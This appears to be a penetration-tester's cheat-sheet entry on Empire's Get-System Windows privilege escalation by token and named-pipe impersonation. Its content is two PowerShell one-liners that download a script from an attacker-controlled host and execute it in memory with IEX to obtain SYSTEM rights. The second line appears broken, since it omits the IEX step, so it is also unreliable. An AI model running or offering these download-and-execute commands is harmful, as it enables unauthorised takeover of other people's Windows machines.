# Get-System.

% SeAssignPrimaryToken, token, named pipe impersonation
#plateform/windows #target/local #cat/PRIVESC


## onliner (token)
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/windows/windows_weaponize/ps/empire/privesc/Get-System.ps1') | IEX; Get-System -Technique Token
```

## online (named pipe)
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/windows/windows_weaponize/ps/empire/privesc/Get-System.ps1') | Get-System -ServiceName '<service_name>' -PipeName '<pipe_name>'
```